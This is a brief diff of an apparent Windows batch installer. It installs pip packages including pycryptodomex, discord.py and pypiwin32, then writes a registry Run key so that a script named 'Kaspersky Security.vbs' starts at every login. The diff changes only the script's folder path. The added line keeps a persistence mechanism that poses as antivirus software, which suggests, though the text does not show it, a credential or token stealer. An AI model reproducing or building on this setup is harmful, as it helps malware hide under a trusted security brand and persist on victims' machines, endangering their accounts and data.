@@ -6,4 +6,4 @@ py -m pip install requests
 py -m pip install pycryptodomex
 py -m pip install discord.py
 py -m pip install pypiwin32
-@reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v sse /t REG_SZ /d "\"C:\Users\%USERNAME%\AppData\Roaming\ExLoader Lib\Kaspersky Security.vbs"\" /f
+@reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v sse /t REG_SZ /d "\"C:\Users\%USERNAME%\AppData\Roaming\ExLoader\Kaspersky Security.vbs"\" /f
